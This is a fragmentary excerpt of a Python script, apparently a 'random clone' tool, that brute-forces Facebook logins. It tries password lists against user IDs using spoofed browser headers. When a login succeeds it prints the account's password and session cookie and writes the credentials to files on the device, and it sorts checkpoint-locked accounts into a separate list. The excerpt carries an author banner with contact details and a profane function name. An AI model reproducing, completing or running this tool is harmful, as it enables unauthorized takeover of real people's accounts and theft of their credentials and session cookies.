...
==================================================
[тАв] AUTHOR    : MUMIT ISLAM HIMU
[тАв] TOOLS     : RANDOM CLONE
[тАв] TYPE      : FREE
[тАв] FACEBOOK  : Mumit Islam
[тАв] WHATSAPP  : +8801644777805
==================================================""")
...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 9370, 9376, 9377, 9378')
    ...
    print(' [+] OK Ids saved in ABID/OK.txt')
    print(' [+] CP Ids saved in ABID/CP.txt')
    print(mumitx)
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[ABID]├Ч[%s/%s]├Ч[OK-%s]├Ч[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'accept-language': 'en-BB,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[ABID-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/ABID/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ABID-CP] {cid}|{ps}")
                open('/sdcard/ABID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
